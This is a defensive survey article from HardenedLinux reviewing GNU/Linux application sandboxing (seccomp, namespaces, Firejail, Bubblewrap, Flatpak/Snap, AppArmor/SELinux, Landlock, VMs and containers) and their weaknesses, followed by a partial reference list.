# GNU/Linux Sandboxing - A Brief Review

`https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review`

# HardenedLinux

Aug 20, 2024 - 21 minute read - Research

**Authors:** • Wei • Shawn Chang **Revision:** 0.2


**Abstract:**


> *In the modern operating system, application sandbox has become an effective security mechanism to confine the permissions of run-time programs, thereby reducing the risk that the other applications and the core system components in the system are affected by the program’s malicious behaviors. Although the development of sandbox solutions on the GNU/Linux operating systems falls relatively behind compared to some proprietary systems and mobile operating systems, many efforts have already been made by the communities, and it does not lack practicable productions among them. This paper gives an incomplete review of existing sandbox solutions on the GNU/Linux operating system, which only covers the often-used or commonly-studied solutions. We hope it can be a reference to the GNU/Linux communities, including users, package maintainers, and application developers.*


*Authors:    • Wei    • Shawn Chang     
Revision: 0.2*

## Introduction


On operating systems, the sandbox is a common technique to secure the system from being affected by application vulnerabilities by creating a restricted and controlled environment for the runtime application, thereby isolating and limiting the program from accessing the filesystem, system calls, and other system resources outside of the application’s running environment [1](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fn:1). The sandbox protects the system resource under attack from being accessed and tampered with when exploitable vulnerabilities occur in the application. It also prevents sensitive data from being stolen by the potential malicious behaviors of the application, intentionally or unintentionally.


Regarding the GNU/Linux platform, although there are already a number of sandbox solutions, some security experts think it lacks an effective and widely applied implementation [2](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fn:2) [3](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fn:3). This article is a general but not complete survey of the sandbox technique on the GNU/Linux platform. It first introduces the interfaces that need to be restricted by an application sandbox. Then, existing sandbox solutions on the GNU/Linux operating systems are presented and discussed. Also, there are some discussions about the weaknesses of the sandbox on GNU/Linux throughout the text.


## Sandbox Interfaces


Sandbox interfaces are system and hardware resources whose access permission is to be restricted in a sandbox solution. With a filtering mechanism, the sandbox sits between these resources outside and the application inside, thereby allowing or disallowing access behaviors according to a set of pre-defined or customized policies. The design of the sandbox policy follows the least-privilege and minimized access permission principle. Usually, the customizable policy makes it possible users, application administrators, or developers to adjust the policy afterward according to the requirements in the actual scenarios.


This section lists the commonly existing interfaces managed by the sandboxes on the GNU/Linux platform and the general practices to control and restrict the program from accessing them.


### Filesystem Access


The filesystem access, including directories and files, should be restricted to prevent the application from reading or writing to files containing critical and sensitive system information. By writing to sensitive files like executable or configuration files, the attacker can inject malicious code or the backdoor and may followingly obtain further privileges or even root permission. In addition, some of these sensitive files, such as `/etc/machine-id` [4](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fn:4), can be used to track the user and threaten the user’s privacy.


The restriction of filesystem access can be implemented by blocking the application directly, as most MAC tools do, or creating a virtual filesystem environment where only necessary directories or files have been mapped.


### System Call


System calls are kernel interfaces exposed to the userspace called by the application to execute critical functions, including memory managing, file system operating, process controlling, and other kernel-level tasks. There are more than 400 system calls for kernel version 5.14 on all system architectures [5](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fn:5) . Usually, an application only uses a small set of system calls. It is necessary to limit the access of the system calls to avoid the unused ones being misused by potential vulnerabilities.


Seccomp is a security mechanism implemented in the kernel to restrict the application process from accessing unnecessary system calls. Only the very basic system calls such as `read()`, `write()`, `_exit()`, and `sigreturn()` are allowed by defaut. Seccomp-bpf is an extension of Seccomp, which provides a configurable filter design based on the Berkeley Packet Filter (BPF) rule. Seccomp and Seccomp-bpf have been integrated and utilized by many sandbox solutions on the GNU/Linux platform.


### Network


A sandbox solution should be able to put the network access in the control based on the application status or pre-defined policies. On the GNU/Linux platform, firewall tools such as iptables and nftables can set rules based on the process ID or user ID. For example, iptables carries out the `-m owner` option with `--pid-owner`, `--uid-owner`, and `--gid-owner` in the rule configuration. A higher-level sandbox solution can work similarly to an application firewall on the network restriction.


Another viable approach is to restrict network access through network namespace, which provides a way to create virtual networks for the separate applications, thereby easily controlling their network accessing behaviors.


### Device


Controlling the access permissions to the devices by the application, such as hard drive, microphone, and digital camera, is a critical sandboxing interface considering the user’s security and privacy. On GNU/Linux, considering all devices except the network devices and the video adapter present as device files under /dev/, the access to the devices could be controlled by setting the permission of the device file in terms of reading, writing, and executing for specified users and groups. During the system loading process, the default permissions of the devices are set by udev rules. Moreover, the cgroups feature [6](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fn:6) in the Linux kernel is also a viable tool to control and isolate the application processes from accessing some devices. It is used by many container solutions.


### Process


As one of the purposes of the application sandbox, the process in a sandbox should be restricted to access or see other processes outside the box.


Inter-Process Communication (IPC) is an often-used mechanism by the operating systems to deliver and synchronize the information between different processes. The GNU/Linux operating system could create boundaries between different groups of processes using IPC Namespace [7](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fn:7). Also, PID Namespace [8](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fn:8) isolates process IDs. Each PID namespace has a dedicated environment, so two processes in different PID namespaces may have the same process ID number. In addition, cgroups is another powerful tool in isolating the application processes.


As one of the commonly used IPC mechanisms, D-Bus is widely used for desktop applications. D-Bus is designed as a bus system that provides inter-process communication and process lifecycle management [9](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fn:9), and it has been available on many often-used applications, such as Gnome Nautilus, Network Manager, Dolphin, and KMail [10](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fn:10). Therefore, as a sandbox solution, it is necessary to manage the access permission to D-Bus, which can be done by editing the configurations of the `<policy>` section in the file `/usr/share/dbus-1/session.conf` [11](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fn:11) or modifying D-Bus service files under the directory `/usr/share/dbus-1/services/` [12](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fn:12).


### Window System


By design, the GUI applications running on the X Window system are able to obtain the input of other applications without any restriction. It opens a risk that a keylogger running behind may secretly steal sensitive information typed by users.


Lauching different applications in separated X Window sessions can mitigate this issue but it brings further complexity to the sandbox configuration. A native solution is to apply the window systems based on the Wayland protocol [13](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fn:13), which provides the isolation between GUI applications by design [14](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fn:14). However, as a prerequisite, the desktop environment should support the Wayland protocol as well as the applications running on it.


Major desktop environments, including Gnome [15](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fn:15) and KDE [16](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fn:16), have integrated their native Wayland support as the default delivery option. XFCE’s Wayland support is still working in progress [17](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fn:17). On Gnome, most of the commonly used native applications have been covered under the Wayland, such as Gnome Terminal, Evince, Nautilus, etc. Also, LibreOffice and web browsers, such as Mozilla Firefox and Chromium, have already implemented native Wayland support.


### Audio


The audio service on the GNU/Linux platform, namely PulseAudio, follows a user-centric security model, so it does not provide any isolation mechanisms [18](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fn:18), which poses a security concern as applications can do things like snooping on another application’s audio content, accessing the microphone and recording the sound input, loading or unloading server modules, snooping on the audio server’s shared memory pool, and so on.


As an alternative to PulseAudio, Pipwire addresses these problems by designing an access control mechanism in the product [19](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fn:19). It also officially supports the Flatpak applications [20](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fn:20) in which the sandboxing solution is available. So far, most of the major GNU/Linux distributions have migrated their sound system to Pipewire.


## Linux Sandbox Solutions


### Dedicated Sandbox Solutions: Firejail, Bubblewrap, and Minijail


There is never a lack of arguments in the Open Source communities regarding the weaknesses of sandbox solutions in the GNU/Linux platform. In an article [2](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fn:2), Madaidans points out that the GNU/Linux operating system is short of an efficient sandboxing mechanism compared with other operating systems. The article mentions two GNU/Linux sandboxing mechanisms in terms of Flatpak and Firejail. However, Flatpak is not a dedicated sandboxing solution. It is far more than that. As defined, Flatpak is an application building, managing, and distributing tool on the GNU/Linux distributions platform [21](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fn:21), which employs the sandbox tool, namely Bubblewrap, to secure the applications that have been built and packaged [22](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fn:22). In the same article, the author brings the Bubblewrap up as a comparison to the Firejail and gives credit to its less attack surface design.


As stated by the author, the problem with the bubblewrap is its learning curve, which means it is difficult to learn and deploy in practice because of its minimalized design. However, this problem can be addressed by developing the community rule set and wrapper programs on a higher layer. In contrast, the shortage of another sandboxing tool, Firejial, is severe. The main problem is it uses SUID to start the sandboxed applications, which leaves the risk of privilege escalation.


Despite the issue, in practice, Firejail still provides a relatively high level of protection to the system by mitigating malicious behavior from the application inside the box, especially when most of the threats derive from the application installed according to one’s threat model. Firejail covers most sandbox interfaces using various mechanisms, including Seccomp-bpf, Linux namespaces, Linux capabilities, cgroup, D-bus filtering, etc. Its user-friendly command-line interface and configuration options make Firejial easier to accept by policy developers and normal users, thereby increasing the overall security of the running environment.


Minijail is another dedicated open-source sandbox developed by Google for applications running on ChromeOS and Android [23](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fn:23). Like Firejial, it provides a confinement environment utilizing Seccomp and Linux namespace. Still, it has the same issue with Firejail, which requires root privilege to launch the application. Additionally, as the purpose of its development, Minijail is only officially available for ChromOS and Android as it depends on libchrome [24](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fn:24). Although it is possible to build the binary from the code on other GNU/Linux systems [25](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fn:25), there is no official package available on most desktop GNU/Linux distributions till now.


In general, the problems with these sandbox soluitions described above have already been noticed by the community developers and discussed broadly. Many community projects have been started in trying to resolve these issues on Bubblwrap and Firejail. For instance, the Bubblejail sandbox based on Bubblewrap [26](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fn:26) is an attempt to be there as an alternative to Firejail. Meanwhile, the Firejail community is talking about the unprivileged sandboxing without SUID and the splitting of the SUID part of functions into a separate binary [27](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fn:27).


### Sandbox Enabled by Package Management


Some package management systems introduced their built-in sandbox solutions based on existing techniques for privilege confinement. Snap [28](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fn:28), managed by Canonical and used on Ubuntu, implements the sandboxing using AppArmor [29](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fn:29) and Seccomp, whereas the cross-platform package management application Flatpak [30](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fn:30) involves Bubblewrap [31](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fn:31) as mentioned before. AppImage does not have a built-in mechanism, but the sandbox can be created using Firejail with the `--appimage` option.


By implementing the sandbox solution in package management, the complex works of making policies are transfered from the application users to the package maintainers who have better knowledge and understanding of the application. It helps to create more reasonable policies, and more essentially, these policies can be updated along with the application.


The integrated sandbox solution also reduces the deployment cost and increases the coverage of sandboxed applications because they are usually enabled by default.


In addition, in contrast to the conventional packaging systems such as APT and RPM, often this new kind of system has the mechanism to put the dependencies, usually, the shared libraries used by the application, into the packages [32](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fn:32) [33](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fn:33), thereby leaving less interface of library calling to the outside of the package. This feature is helpful in creating the sandbox virtual environment.


Despite that, the problem within the package management system is worth being concerned about. A study from Dunlap *et al.* in 2022 [34](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fn:34) discovered that package maintainers tend to follow the least-privilege principle on policymaking and the security from the system level is improved, but only 58.3% of Flatpak applications and 90.1% of Snap applications defined proper sandbox policies. In other words, only a part of the applications had been covered under the protection of their sandbox mechanisms. Indeed, users could override existing policies with their own ones by means of, for instance, adding execution options for improperly protected or unprotected Flatpak applications or using tools such as Flatseal [35](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fn:35), it is still time-consuming and the requirement here is to deliver the security by default.


Another weakness often argued by the communities on these all-in-on package solutions is that the dependencies included may not be patched in time as soon as the vulnerabilities have been discovered. Thus, they give a “false sense of security”. Nevertheless, as Dunlap *et al.* points out [34](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fn:34), this is an issue with the maintainer but not the design of the packaging system.


The candidate solution to these issues is to standardize the packaging process in the community. It is important to ensure every package has reasonable policies defined in the process. Also, even if a CVE is found in only one of these dependencies, that package must be rebuilt and published as fast as possible, just as the ordinary GNU/Linux packaging systems do. Meanwhile, the communities may introduce an automatic notification mechanism to inform the package maintainers when vulnerabilities in dependencies have been reported, according to their severity.


### MAC Tools


MAC (Mandatory Access Control) tools based on LSM, such as SELinux and AppArmor, can also be used for the purpose of application confinement. However, they mainly focus on restricting the file and object accessed by the application processes, thus not the overall sandbox solutions. For example, they do not provide a virtual environment or containerized environment.


In addition, it is difficult for normal users or package maintainers to develop security policies or to customize the privileges exposed to the confined applications, particularly obvious for the SELinux policy development in contrast to the AppArmor, where many specific concepts such as SELinux users, roles, and types, are involved. This issue is obvious in the GUI applications, which are more complicated and probably involve more system resources. Most GNU/Linux distributions with MAC tools enabled only have policies that cover limited applications.


Despite that, MAC tools can work with other existing security features like Seccomp and Capabilities to make an additional hardening layer. For instance, Firejail has an option to run itself with AppArmor confinement enabled [36](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fn:36).


The policy development issue can be addressed by involving experts who are familiar with both the MAC policies and the application privileges. It cost time and efforts, but the investment could benefit all the downstream distribution communities, just like what firejail community has done on developing applicaiton profiles.


### Landlock


There are also other sandboxing solutions, mostly in the experiment phase, on GNU/Linux platform which are not covered in Madaidan’s article. Landlock [37](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fn:37) is one of them.


Implemented in the kernel space, Landlock is designed as an unprivileged access control mechanism in the LSM for the purpose of creating the sandbox during application development. Since it is part of the LSM, it can be a stackable layer upon other existing Linux security mechanisms in LSM [38](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fn:38) such as SELinux, Apparmor, and other MAC tools. With the help of new system calls, namely `landlock_create_ruleset()`, `landlock_add_rule()`, and `landlock_restrict_self()`, Landlock creates embedded policy for an application in its code, thereby reducing the tedious and error-prone work of policy development on the downstream developers package and maintainer. Also, thanks for the system call interfaces, Landlock works in an unprivileged way where the risk of privilege escalation is further reduced.


The embedded policy moves the policy-making tasks from the sandbox solution developers and users to the upstream application developers. The Landlock project only provides the sandboxing mechanisms, namely Landlock system calls. Also, users or package maintainers do not need to care about policy configuration [38](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fn:38). The absence of userspace configuration tools simplifies the work for downstream distributions to a great extent. Only the enabling of kernel options `CONFIG_SECURITY_LANDLOCK=y` and `CONFIG_LSM=landlock,...` is required. So far, these kernel options have already been the default options on many major Linux distributions, such as Ubuntu, Fedora, openSUSE Tumbleweed, Gentoo, and Arch Linux [39](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fn:39) [40](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fn:40).


However, the built-in policy increases the workload of the upstream application developers. They have to define the policy and maintain this part of the code continuously. Not all application developers are willing to do these additional works. It is a blocker for promoting sandbox solutions in general. Up to now, most Linux applications do not have dedicated landlock implementations. The developer of the Landlock project tried to push the patch of the tar command with the sandbox implementation to its GNU Project but so far has not received any responses [41](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fn:41).


To address this issue, the third-party sandbox solutions could implement the landlock in their code so the ruleset takes effect on the sandboxed applications, just as Firejail does [42](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fn:42). In this way, the ruleset becomes configurable for users and profile developers.


### Virtualization and Containerization


Another common practice is employing Virtualization or Containerization techniques as a sandbox solution in the Linux environment. Virtualization and containerization provide a virtualized environment where the sandboxed application runs. Since everything is in the environment, the interfaces like system calls and file systems are self-contained in the images. Therefore, the configuration of these interfaces is not required. Virtualization solutions such as KVM and XEN include the entire Linux kernel in a completely isolated runtime environment. In contrast, containerization solution like Docker, Linux Containers (LXC), and Podman create their separate root structure and resources with the help of the Linux namespace and organize the processes using Control Group (cgroup) to create an isolated environment [43](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fn:43).


Nevertheless, both virtualization and containerization have not been designed as sandbox solutions from the very beginning. It is difficult for users to run applications in those environments without tedious configurations. Users must take care of file sharing between the host and guest system when files need to be created or read on the host system. Moreover, the entire system installed in the virtual environment must be updated regularly. It increases the overall time cost of the sandbox maintenance. Performance is another non-ignorable consideration. Even with the help of CPU Virtualization features, the consumption of host’s CPU Power, memory, and disk space still takes up a significant portion of the system resource compared to other sandbox solutions.


More importantly, using virtualization and containerization as sandbox solutions also has security weaknesses. Regarding virtualization, virtual machine escape attack is always a risk. In terms of containerization, it provides only limited protection to the application. Usually, the kernel space processing is shared with the host system and other containers. More seriously, container solutions like Docker require root privilege to start the daemon, which further increases the attack interface.


Some attempts have been made by the communities to address the above issues. For example, QubeOS based on Xen virtualization supports running various Linux applications in separate virtual machine environments [44](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fn:44), which reduces the complexity of creating the virtualization sandboxes. Moreover, as a virtual machine monitor (VMM) that targets serverless computing, Firecracker builds and manages KVM-based microVMs with a lightweight and minimalist design to limit the attack surface [45](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fn:45). Also, the openSUSE MicroOS project keeps a similar idea in its design but mainly targets container deployment in the minimized VM environment [46](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fn:46). These projects can be potential candidates for the VM-type sandboxing solution due to their ability to reduce the consumption of the system resources. Finally, the container consumes much fewer system resources than the virtual machine sandbox solution. Compared to Docker, Podman is more suitable as a sandbox due to its rootless and daemonless features [47](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fn:47).


## Conclusion


So far, this article gives a general overview of the sandbox solutions on the GNU/Linux platform and discusses the weaknesses and community efforts to address these weaknesses. In a word, despite the various weaknesses of these sandbox solutions, GNU/Linux provides more choices in contrast to the proprietary operating systems. Moreover, these solutions can be combined or stacked to achieve a higher level of protection.


No matter what operating systems they are, there is no such thing as a “true sandbox” solution. Depending on the complexity of the application protected, it always has some resources and interfaces exposed to the host system or other applications to a certain extent, such as system calls, file systems, and devices. Otherwise, the application does not function properly. These exposed interfaces may introduce exploitable vulnerabilities and then weaken the entire protection mechanism. Again, it is not only a “Linux thing”. To evaluate the protection level of sandbox solution on a specific operating system platform, not only the general design needs to be examined, but also the implementation in detail. Therefore, code-level auditing conducted by multiple parties may be necessary, which is hard to implement on proprietary platforms.


## References


---


1. I. Borate and R. K. Chavan, “Sandboxing in linux: From smartphone to cloud.” *International Journal of Computer Applications,* vol.148, no.8, August 2016, doi:10.5120/ijca2016911256. [Online]. Available: [https://www.ijcaonline.org/archives/volume148/number8/25774-2016911256](https://www.ijcaonline.org/archives/volume148/number8/25774-2016911256) [↩︎](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fnref:1)
2. Madaidan. “Security & Privacy Evaluations,” Madaidan’s Insecurities, March 18, 2022. Accessed: August 10, 2024. [Online]. Available: [https://madaidans-insecurities.github.io/linux.html](https://madaidans-insecurities.github.io/linux.html) [↩︎](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fnref:2) [↩︎](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fnref1:2)
3. S. Designer. “Re: major changes if gnu/linux dominates the desktop and/or mobile market?,” Openwall, October t, 2020. Accessed: August 10, 2024. [Online]. Available: [https://www.openwall.com/lists/oss-security/2020/10/05/5](https://www.openwall.com/lists/oss-security/2020/10/05/5) [↩︎](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fnref:3)
4. Systemd. “machine-id(5) — Linux manual page,” man7.org. Accessed: August 11, 2024. [Online]. Available: [https://man7.org/linux/man-pages/man5/machine-id.5.html](https://man7.org/linux/man-pages/man5/machine-id.5.html) [↩︎](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fnref:4)
5. The Linux Kernel Organization. “syscalls(2) — Linux manual page,” man7.org, May 2, 2024. Accessed: August 11, 2024. [Online]. Available: [https://man7.org/linux/man-pages/man2/syscalls.2.html](https://man7.org/linux/man-pages/man2/syscalls.2.html) [↩︎](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fnref:5)
6. The Linux Kernel Organization. “cgroups(7) — Linux manual page,” man7.org, June 15, 2024. Accessed: August 11, 2024. [Online]. Available: [https://man7.org/linux/man-pages/man7/cgroups.7.html](https://man7.org/linux/man-pages/man7/cgroups.7.html) [↩︎](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fnref:6)
7. The Linux Kernel Organization. “ipc_namespaces(7) — Linux manual page,” man7.org, May 2, 2024. Accessed: August 11, 2024. [Online]. Available: [https://man7.org/linux/man-pages/man7/ipc_namespaces.7.html](https://man7.org/linux/man-pages/man7/ipc_namespaces.7.html) [↩︎](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fnref:7)
8. The Linux Kernel Organization. “pid_namespaces(7) — Linux manual page,” man7.org, June 13, 2024. Accessed: August 11, 2024. [Online]. Available: [https://man7.org/linux/man-pages/man7/pid_namespaces.7.html](https://man7.org/linux/man-pages/man7/pid_namespaces.7.html) [↩︎](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fnref:8)
9. “dbus,” freedesktop.org, February 28, 2022. Accessed: August 15, 2024. [Online]. Available: [https://www.freedesktop.org/wiki/Software/dbus/](https://www.freedesktop.org/wiki/Software/dbus/) [↩︎](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fnref:9)
10. “DbusProjects,” freedesktop.org, May 18, 2013. Accessed: August 15, 2024. [Online]. Available: [https://www.freedesktop.org/wiki/Software/DbusProjects/](https://www.freedesktop.org/wiki/Software/DbusProjects/) [↩︎](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fnref:10)
11. “dbus-daemon — Message bus daemon,” freedesktop.org, August 21, 2023. Accessed: August 15, 2024. [Online]. Available: [https://dbus.freedesktop.org/doc/dbus-daemon.1.html](https://dbus.freedesktop.org/doc/dbus-daemon.1.html) [↩︎](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fnref:11)
12. Firejail. “Frequently Asked Questions,” GitHub wiki. Accessed: August 15, 2024. [Online]. Available: [https://github.com/netblue30/firejail/wiki/Frequently-Asked-Questions#how-do-i-sandbox-applications-started-via-systemd-or-d-bus-services](https://github.com/netblue30/firejail/wiki/Frequently-Asked-Questions#how-do-i-sandbox-applications-started-via-systemd-or-d-bus-services) [↩︎](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fnref:12)
13. K. Høgsberg. “Wayland - The Wayland Protocol,” freedesktop.org. Accessed: August 10, 2024. [Online]. Available: [https://wayland.freedesktop.org/docs/html/](https://wayland.freedesktop.org/docs/html/) [↩︎](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fnref:13)
14. Debian. “Wayland,” debian.org, May 1, 2024. Accessed: August 12, 2024. [Online]. Available: [https://wiki.debian.org/Wayland](https://wiki.debian.org/Wayland) [↩︎](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fnref:14)
15. The GNOME Project. “Wayland,” gnome.org, May 12, 2017. Accessed: August 14, 2024. [Online]. Available: [https://wiki.gnome.org/Initiatives/Wayland](https://wiki.gnome.org/Initiatives/Wayland) [↩︎](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fnref:15)
16. “KWin/Wayland,” KDE Community Wiki, February 4, 2022. Accessed: August 14, 2024. [Online]. Available: [https://community.kde.org/KWin/Wayland](https://community.kde.org/KWin/Wayland) [↩︎](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fnref:16)
17. “Xfce Wayland Development Roadmap”, Xfce Developer Wiki, March 18, 2024. Accessed: August 14, 2024. [Online]. Available: [https://wiki.xfce.org/releng/wayland_roadmap](https://wiki.xfce.org/releng/wayland_roadmap) [↩︎](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fnref:17)
18. “Access Control – Development Documentation – PulseAudio,” freedesktop.org, May 7, 2021. Accessed: August 14, 2024. [Online]. Available: [https://www.freedesktop.org/wiki/Software/PulseAudio/Documentation/Developer/AccessControl/](https://www.freedesktop.org/wiki/Software/PulseAudio/Documentation/Developer/AccessControl/) [↩︎](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fnref:18)
19. “PipeWire: Access Control,” Pipewire Document. Accessed: August 14, 2024. [Online]. Available: [https://docs.pipewire.org/page_access.html](https://docs.pipewire.org/page_access.html) [↩︎](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fnref:19)
20. “Pipewire,” Pipewire, 2022. Accessed: August 14, 2024. [Online]. Available: [https://pipewire.org](https://pipewire.org) [↩︎](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fnref:20)
21. Flatpak Team. “Introduction to Flatpak,” Flatpak documentation, June 30, 2024. Accessed: August 16, 2024. [Online]. Available: [https://docs.flatpak.org/en/latest/introduction.html#terminology](https://docs.flatpak.org/en/latest/introduction.html#terminology) [↩︎](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fnref:21)
22. Flatpak Team. “Under the Hood,” Flatpak documentation, July 24, 2024. Accessed: August 16, 2024. [Online]. Available: [https://docs.flatpak.org/en/latest/under-the-hood.html](https://docs.flatpak.org/en/latest/under-the-hood.html) [↩︎](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fnref:22)
23. Google. “./ minijail,” Github page. Accessed: August 16, 2024. [Online]. Available: [https://google.github.io/minijail/](https://google.github.io/minijail/) [↩︎](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fnref:23)
24. “Minijail,” Google Git Repositories on Chromium, March 22, 2024. Accessed: August 16, 2024. [Online]. Available: [https://chromium.googlesource.com/chromiumos/platform/minijail#historical-notes](https://chromium.googlesource.com/chromiumos/platform/minijail#historical-notes) [↩︎](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fnref:24)
25. “Hacking on Minijail,” Google Git repository on Chromium, August 30, 2022. Accessed: August 17, 2024. [Online]. Available: [https://chromium.googlesource.com/chromiumos/platform/minijail/+/refs/heads/main/HACKING.md](https://chromium.googlesource.com/chromiumos/platform/minijail/+/refs/heads/main/HACKING.md) [↩︎](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fnref:25)
26. “Bubblejail,” Github repository, May 26, 2024. Accessed: August 9, 2024. [Online]. Available: [https://github.com/igo95862/bubblejail/>](https://github.com/igo95862/bubblejail/%3e) [↩︎](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fnref:26)
27. “unprivileged firejail,” Github issues, January 19, 2024. Accessed: August 9, 2024. [Online]. Available: [https://github.com/netblue30/firejail/issues/5157](https://github.com/netblue30/firejail/issues/5157) [↩︎](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fnref:27)
28. Canonical Ubuntu. “Introduction to snaps,” ubuntu.com, March 22, 2022. Accessed: August 10, 2024. [Online]. Available: [https://ubuntu.com/core/services/guide/snaps-intro](https://ubuntu.com/core/services/guide/snaps-intro) [↩︎](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fnref:28)
29. Canonical Ubuntu. “Security and sandboxing,” ubuntu.com, February 9, 2023. Accessed: August 10, 2024. [Online]. Available: [https://ubuntu.com/core/docs/security-and-sandboxing](https://ubuntu.com/core/docs/security-and-sandboxing) [↩︎](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fnref:29)
30. “Flatpak,” Flatpak. Accessed: August 10, 2024. [Online]. Available: [https://flatpak.org](https://flatpak.org) [↩︎](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fnref:30)
